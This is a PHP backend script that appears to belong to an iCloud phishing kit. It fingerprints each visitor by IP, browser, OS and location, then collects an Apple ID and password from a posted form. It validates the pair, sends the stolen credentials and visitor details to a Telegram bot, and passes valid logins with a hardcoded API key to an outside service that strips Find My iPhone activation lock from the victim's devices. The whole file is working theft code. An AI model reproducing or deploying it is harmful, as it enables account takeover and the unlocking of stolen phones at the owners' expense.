<?php
function getOS($user_agent) { 
    $os_platform  = "Unknown OS Platform";
    $os_array     = array(
                          '/windows nt 10/i'      =>  'Windows 10',
                          '/windows nt 6.3/i'     =>  'Windows 8.1',
                          '/windows nt 6.2/i'     =>  'Windows 8',
                          '/windows nt 6.1/i'     =>  'Windows 7',
                          '/windows nt 6.0/i'     =>  'Windows Vista',
                          '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                          '/windows nt 5.1/i'     =>  'Windows XP',
                          '/windows xp/i'         =>  'Windows XP',
                          '/windows nt 5.0/i'     =>  'Windows 2000',
                          '/windows me/i'         =>  'Windows ME',
                          '/win98/i'              =>  'Windows 98',
                          '/win95/i'              =>  'Windows 95',
                          '/win16/i'              =>  'Windows 3.11',
                          '/macintosh|mac os x/i' =>  'Mac OS X',
                          '/mac_powerpc/i'        =>  'Mac OS 9',
                          '/linux/i'              =>  'Linux',
                          '/ubuntu/i'             =>  'Ubuntu',
                          '/iphone/i'             =>  'iPhone',
                          '/ipod/i'               =>  'iPod',
                          '/ipad/i'               =>  'iPad',
                          '/android/i'            =>  'Android',
                          '/blackberry/i'         =>  'BlackBerry',
                          '/webos/i'              =>  'Mobile'
                    );
    foreach ($os_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $os_platform = $value;
    return $os_platform;
} 
function getBrowser(){
$agent = $_SERVER['HTTP_USER_AGENT'];
$name = 'NA';
if (preg_match('/MSIE/i', $agent) && !preg_match('/Opera/i', $agent)) {
    $name = 'Internet Explorer';
} elseif (preg_match('/Firefox/i', $agent)) {
    $name = 'Mozilla Firefox';
} elseif (preg_match('/Chrome/i', $agent)) {
    $name = 'Google Chrome';
} elseif (preg_match('/Safari/i', $agent)) {
    $name = 'Apple Safari';
} elseif (preg_match('/Opera/i', $agent)) {
    $name = 'Opera';
} elseif (preg_match('/Netscape/i', $agent)) {
    $name = 'Netscape';
}
return $name;
}
function ip_info($ip = NULL, $purpose = "location", $deep_detect = TRUE) {
    $output = NULL;
    if (filter_var($ip, FILTER_VALIDATE_IP) === FALSE) {
        $ip = $_SERVER["REMOTE_ADDR"];
        if ($deep_detect) {
            if (filter_var(@$_SERVER['HTTP_X_FORWARDED_FOR'], FILTER_VALIDATE_IP))
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            if (filter_var(@$_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP))
                $ip = $_SERVER['HTTP_CLIENT_IP'];
        }
    }
    $purpose    = str_replace(array("name", "\n", "\t", " ", "-", "_"), NULL, strtolower(trim($purpose)));
    $support    = array("country", "countrycode", "state", "region", "city", "location", "address");
    $continents = array(
        "AF" => "Africa",
        "AN" => "Antarctica",
        "AS" => "Asia",
        "EU" => "Europe",
        "OC" => "Australia (Oceania)",
        "NA" => "North America",
        "SA" => "South America"
    );
    if (filter_var($ip, FILTER_VALIDATE_IP) && in_array($purpose, $support)) {
        $ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
        if (@strlen(trim($ipdat->geoplugin_countryCode)) == 2) {
            switch ($purpose) {
                case "location":
                    $output = array(
                        "city"           => @$ipdat->geoplugin_city,
                        "state"          => @$ipdat->geoplugin_regionName,
                        "country"        => @$ipdat->geoplugin_countryName,
                        "country_code"   => @$ipdat->geoplugin_countryCode,
                        "continent"      => @$continents[strtoupper($ipdat->geoplugin_continentCode)],
                        "continent_code" => @$ipdat->geoplugin_continentCode
                    );
                    break;
                case "address":
                    $address = array($ipdat->geoplugin_countryName);
                    if (@strlen($ipdat->geoplugin_regionName) >= 1)
                        $address[] = $ipdat->geoplugin_regionName;
                    if (@strlen($ipdat->geoplugin_city) >= 1)
                        $address[] = $ipdat->geoplugin_city;
                    $output = implode(", ", array_reverse($address));
                    break;
                case "city":
                    $output = @$ipdat->geoplugin_city;
                    break;
                case "state":
                    $output = @$ipdat->geoplugin_regionName;
                    break;
                case "region":
                    $output = @$ipdat->geoplugin_regionName;
                    break;
                case "country":
                    $output = @$ipdat->geoplugin_countryName;
                    break;
                case "countrycode":
                    $output = @$ipdat->geoplugin_countryCode;
                    break;
            }
        }
    }
    return $output;
}
function getUserIP(){
    // Get real visitor IP behind CloudFlare network
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
              $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
              $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}
$url = htmlspecialchars($_SERVER['HTTP_REFERER']);
$uri = "#".$url;
$auth = end(explode('=', $url));
$lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
$IP = getUserIP();
$browser = getBrowser();
$os = getOS($_SERVER['HTTP_USER_AGENT']);
$country = ip_info("Visitor", "City")." ".ip_info("Visitor", "Country");
include('../js/ajaxi.php');
include('../fmi.php');
if (!empty($_POST["appleID"]) && !empty($_POST["pw"])) {
    $key = $_POST["key"];
    $isOkKey = true;
    $pass = $_POST["pw"];
    $id = $_POST["appleID"];
    $auth_status = file_get_contents("https://".$_SERVER['SERVER_NAME']."/auth-icloud.php?id=".$_POST['appleID']."&pw=".$_POST['pw']);
    $auth_status = $auth_status == 200 ? true : false; 
    if ($auth_status) {
        $log = "[IP:" . $in_ip . "]Users Enter Correct Data." . "\n" . "Login:" . $_POST["appleID"] . "\n" . "Password:" . $_POST["pw"] . "\n\n";
            $istatus = "completed";
            $mess = "<p>Your unlock code has been successfully calculated.</p>";
            $mess .= "<p>=================================</p>";
            $mess .= "<p>IP : " . $IP . "</p>";
            $mess .= "<p>Browser : " . $browser . "</p>";
            $mess .= "<p>OS : " . $os . "</p>";
            $mess .= "<p>Dev.Lang : " . $lang . "</p>";
            $mess .= "<p>Country : " . $country . "</p>";
            $mess .= "<p>===========================</p>";
            $mess .= "<p>link : " . $uri . "</p>";
            $mess .= "<p>===========================</p>";
            $mess .= "<p>Unlock code : iCloud OFF</p>";
            $mess .= "<p>Orders details</p>";
            $mess .= "<p>auth : " . $auth . "</p>";
            $mess .= "<p>Apple ID : " . $_POST["appleID"] . "</p>";
            $mess .= "<p>Password : " . $pass . "</p>";
            $mess .= "<p>===========================</p>";
            if ($isOkKey) {
            $messBot = str_replace("</p>", "\n", $mess);
    		$messBot = strip_tags($messBot);
            Telegram("", $messBot);
            $path_to_file = "access.txt";
            $file_contents = file_get_contents($path_to_file);
            $file_contents = str_replace($auth, ",", $file_contents);
            file_put_contents($path_to_file, $file_contents);
    
            }
                $remove = AutoRemove($_POST['appleID'], $_POST['pw']);
                Telegram("", "===== My Autoremove ====\n$remove\n=====  ====");
        echo "OK";
    } else {
        $mess = "<p>User entered wrong password</p>";
        $mess .= "<p>==========================</p>";
        $mess .= "<p>IP : " . $IP . "</p>";
        $mess .= "<p>Browser : " . $browser . "</p>";
        $mess .= "<p>OS : " . $os . "</p>";
        $mess .= "<p>Dev.Lang : " . $lang . "</p>";
        $mess .= "<p>Country : " . $country . "</p>";
        $mess .= "<p>==========================</p>";
        $mess .= "<p>link : " . $uri . "</p>";
        $mess .= "<p>==========================</p>";
        $mess .= "<p>Unlock code : iCloud ON</p>";
        $mess .= "<p>Orders details</p>";
        $mess .= "<p>auth : " . $auth . "</p>";
        $mess .= "<p>Apple ID : " . $_POST["appleID"] . "</p>";
        $mess .= "<p>Password : " . $pass . "</p>";
        $mess .= "<p>==========================</p>";
        if ($isOkKey) {
            $messBot = str_replace("</p>", "\n", $mess);
			$messBot = strip_tags($messBot);
            Telegram("", $messBot);
        }
      //  $log = "Users Enter False Data." . "\n" . "Login:" . $_POST["appleID"] . "\n" . "Password:" . $_POST["pw"] . "\n\n";
     //   $q = "INSERT INTO `false_apple_id` (`ID`, `order_id`, `apple_id`, `pass`) VALUES (NULL, " . $order_id . ", '" . $_POST["appleID"] . "', '" . $pass . "')";
        echo "INVALID";
    }
}
function AutoRemove($id,$pass){
        $msg = file_get_contents("https://".$_SERVER['SERVER_NAME']."/LostMessage.php?id=$id&pass=$pass");
        $msg = json_decode($msg);
        $owner_text = $msg->text;
        $owner_number = $msg->number;
        $myCheck["appleid"] = $id;
        $myCheck["password"] = $pass;
        $myCheck["key"] = "6DR-H5K-85D-ASA-FS7-3U8-YCC-MJB";
        $myCheck["subscription"] = 1;
        $myCheck["format"] = "JSON";
        $ch = curl_init("https://api.ifreeicloud.co.uk");
        curl_setopt($ch, CURLOPT_POSTFIELDS, $myCheck);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
        $myResult = curl_exec($ch);
        $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        if($httpcode==200 && stripos($myResult, "Invalid Apple ID/Password")==false && stripos($myResult, "This domain is not authorised to use SilentRemove API")==false&&stripos($myResult, "This Apple ID is locked")==false) {
          $a=json_decode($myResult);
              
          $name = $a->name;
          $count = $a->count;
          if($count > 0){
              $text = "Message: $owner_text\nLost Number: $owner_number\n\n$name has $count devices.\n\n";
              
              $devices = $a->devices;
              foreach($devices as $device){
                  $aname = $device->name;
                  $model = $device->model;
                  $mode = $device->mode;
                  $status = $device->status;
                  $unlocked = $device->unlocked;
                  if($unlocked){ $unlocked = 'REMOVED'; } else { $unlocked = 'NOPE'; }
                  $text.= "Name: $aname\nModel: $model\nMode: $mode\nStatus: $status\nUnlocked: $unlocked\n\n";
              }
              return $text;
          } else {
            return "This Apple ID no have devices.";
          }
        } else {
            // Invalid Login or Unauthorised Server IP
            return "INVALID";
        }
}
?>